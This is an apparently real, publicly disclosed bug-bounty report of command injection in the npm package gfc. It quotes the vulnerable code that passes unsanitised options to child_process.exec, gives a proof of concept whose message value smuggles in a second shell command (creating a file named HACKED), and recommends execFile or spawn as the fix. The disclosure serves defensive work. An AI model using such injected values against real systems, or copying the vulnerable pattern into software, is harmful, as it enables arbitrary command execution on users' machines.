# [gfc] Command Injection via insecure command formatting

## Report Details
- **Report ID**: 871071
- **URL**: https://hackerone.com/reports/871071
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2020-05-11T20:02:14.558Z
- **Disclosed**: 2020-10-27T20:26:38.379Z

## Reporter
- **Username**: d3lla
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
I would like to report a `Command Injection` issue in the `gfc` module.
It allows to execute arbitrary commands on the victim's PC.

# Module

**module name:** `gfc`
**version:** `2.0.2`
**npm page:** `https://www.npmjs.com/package/gfc`

## Module Description

Simple way to initialize a new git repository in an empty directory, add a file and do a first commit (or skip that part in a directory with files). Useful for unit tests and generators.

## Module Stats

[15] weekly downloads

# Vulnerability

## Vulnerability Description

The issue occurs because a user input parameter is used inside a command that is executed without any proper sanitization. 
Here's the code which causes the issue:

```javascript

// https://github.com/jonschlinkert/gfc/blob/master/index.js#L80
...
const cp = require('child_process');
...
const firstCommit = async(cwd, options, callback) => {
    ....
    const opts = Object.assign({ cwd: cwd }, options);
    ....
    .then(async() => {
      return await exec(createArgs(opts), execOpts); //<-- options
    });
...

function createArgs(options) {
  const opts = Object.assign({}, defaults, options);
  const args = ['git init'];
  const files = opts.files ? arrayify(opts.files).join(' ') : '.';
  let message = opts.message || 'First commit';

  if (message[0] !== '"' && message.slice(-1) !== '"') {
    message = `"${message}"`; //<-- injection
  }

  // backwards compatibility
  if (opts.skipCommit === true) {
    opts.commit = false;
  }

  if (opts.forceFile === true || (opts.file !== false && isEmpty(opts.cwd))) {
    args.push('touch "' + opts.file.path + '"');

    if (opts.file.contents) {
      args.push('echo "' + opts.file.contents.toString() + '" >> ' + opts.file.path);
    }
  }

  if (opts.commit !== false) {
    args.push(`git add ${files}`);
    args.push(`git commit -m ${message}`);
  }

  if (typeof opts.remote === 'string' && isGitUrl(opts.remote)) {
    args.push(`git remote add origin ${opts.remote}`);

    if (opts.push === true) {
      args.push('git push --force origin master:master');
    }
  }

  return args.join(' && ');
}
```
The arguments `options` is used to build the command that is passed to the `child_process.exec` function without any sanitization.


## Steps To Reproduce:
- create a directory for testing
    - `mkdir poc`
    - `cd poc/`

- install `gfc` module:
    -  `npm i gfc`
- create the following PoC JavaScript file (`poc.js`):

```javascript

const firstCommit = require('gfc');
const options = {message: '""; touch HACKED;'};
firstCommit('.', options, function(err) {});

```
- make sure that the `HACKED` file does not exist:
    - `ls`
- execute the `poc.js` file:
    - `node poc.js`
- the `HACKED` file is created:
    - `ls`
    
{F824264}


## Patch
Do not concatenate/format commands using insecure user's input. Always check and sanitize it. 
In my opinion, it's better to use [`child_process.execFile`](https://nodejs.org/api/child_process.html#child_process_child_process_execfile_file_args_options_callback) or [`child_process.spawn`](https://nodejs.org/api/child_process.html#child_process_child_process_spawn_command_args_options) functions instead of `child_process.exec`.

## Supporting Material/References:

- OPERATING SYSTEM VERSION: Ubuntu 18.04.4 LTS
- NODEJS VERSION: v14.1.0
- NPM VERSION: 6.14.5

# Wrap up

- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N] 


Thank you for your time.

best regards,

d3lla

## Impact

Command Injection on `gfc` module via insecure command formatting.

## Attachments
- gfc_poc.mov
